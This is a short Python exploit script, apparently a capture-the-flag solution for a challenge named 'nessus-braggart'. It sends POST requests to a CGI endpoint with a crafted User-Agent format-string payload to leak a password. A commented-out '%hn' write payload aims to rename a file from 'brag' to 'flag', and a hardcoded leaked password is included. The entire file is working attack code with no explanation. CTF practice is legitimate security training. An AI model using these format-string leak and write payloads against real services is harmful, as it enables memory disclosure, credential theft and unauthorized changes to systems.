#!/usr/bin/env python3

import requests

# Leak Password
data_header ={
    "x-debug":"1",
    "User-Agent":"a"*1008 + '%s%{}$s'.format(269+6),
}

io = requests.post("https://nessus-braggart.chals.io/sec.cgi",headers=data_header)

print(io.text)

# Change name file from 'brag' to 'flag'
data_header ={
    "x-debug":"1",
    # "User-Agent":"a"*1008 + '%{}c%{}$hn'.format(0x6c66,261+6),
    "x-password":"xbYP3h7Ua94c"
}

io = requests.post("https://nessus-braggart.chals.io/sec.cgi",headers=data_header)

print(io.text)


